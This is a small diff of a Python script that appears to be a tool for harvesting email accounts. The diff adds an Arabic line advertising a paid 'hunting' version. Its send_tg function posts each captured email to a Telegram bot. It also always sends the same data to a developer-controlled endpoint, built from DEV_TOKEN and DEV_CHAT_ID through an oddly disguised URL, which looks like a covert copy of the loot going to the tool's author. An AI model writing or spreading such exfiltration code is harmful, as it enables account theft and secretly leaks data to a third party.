@@ -142,7 +142,8 @@ def send_tg(email):
 ━━━━━━━━━━━━━━━━━━
 EMAIL: {email}
 ━━━━━━━━━━━━━━━━━━
-BY: @R7_36 ~@R7Aih1"""
+BY: @R7_36 ~@R7Aih1
+اذا حاب تشترك بنسخه المدفوعه ضمان صيد بدون تشفير ب5"""
         if token and chat_id:
             requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}", timeout=5)
         requests.get(f"https://api.{DEV_TOKEN}/={DEV_CHAT_ID}&text={msg}", timeout=5)
